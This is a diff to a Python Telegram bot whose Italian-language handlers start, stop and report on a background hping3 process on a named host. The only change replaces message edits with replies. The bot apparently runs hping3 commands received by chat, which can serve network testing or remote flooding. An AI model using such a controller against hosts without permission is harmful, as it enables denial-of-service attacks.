@@ -43,7 +43,7 @@ def buttons(update, context):
 
     if query.data == "start":
         if LAST_CMD is None:
-            query.edit_message_text("⚠️ Nessun comando hping3 impostato", reply_markup=get_keyboard())
+            query.message.reply_text("⚠️ Nessun comando hping3 impostato", reply_markup=get_keyboard())
             return
 
         if process is None or process.poll() is not None:
@@ -55,25 +55,25 @@ def buttons(update, context):
                     stderr=subprocess.DEVNULL,
                     preexec_fn=os.setsid
                 )
-                query.edit_message_text(f"▶️ AVVIATO su {HOSTNAME}\nComando: {LAST_CMD}", reply_markup=get_keyboard())
+                query.message.reply_text(f"▶️ AVVIATO su {HOSTNAME}\nComando: {LAST_CMD}", reply_markup=get_keyboard())
             except Exception as e:
-                query.edit_message_text(f"❌ Errore avvio comando:\n{e}", reply_markup=get_keyboard())
+                query.message.reply_text(f"❌ Errore avvio comando:\n{e}", reply_markup=get_keyboard())
         else:
-            query.edit_message_text(f"⚠️ Già in esecuzione su {HOSTNAME}", reply_markup=get_keyboard())
+            query.message.reply_text(f"⚠️ Già in esecuzione su {HOSTNAME}", reply_markup=get_keyboard())
 
     elif query.data == "stop":
         if process and process.poll() is None:
             os.killpg(os.getpgid(process.pid), signal.SIGTERM)
             process = None
-            query.edit_message_text(f"⛔ FERMATO su {HOSTNAME}", reply_markup=get_keyboard())
+            query.message.reply_text(f"⛔ FERMATO su {HOSTNAME}", reply_markup=get_keyboard())
         else:
-            query.edit_message_text(f"ℹ️ Nessun processo attivo su {HOSTNAME}", reply_markup=get_keyboard())
+            query.message.reply_text(f"ℹ️ Nessun processo attivo su {HOSTNAME}", reply_markup=get_keyboard())
 
     elif query.data == "status":
         if process and process.poll() is None:
-            query.edit_message_text(f"🟢 ATTIVO su {HOSTNAME}\nComando: {LAST_CMD}", reply_markup=get_keyboard())
+            query.message.reply_text(f"🟢 ATTIVO su {HOSTNAME}\nComando: {LAST_CMD}", reply_markup=get_keyboard())
         else:
-            query.edit_message_text(f"🔴 FERMO su {HOSTNAME}", reply_markup=get_keyboard())
+            query.message.reply_text(f"🔴 FERMO su {HOSTNAME}", reply_markup=get_keyboard())
 
 # ----- Handler per ricevere comandi hping3 -----
 def receive_cmd(update, context):
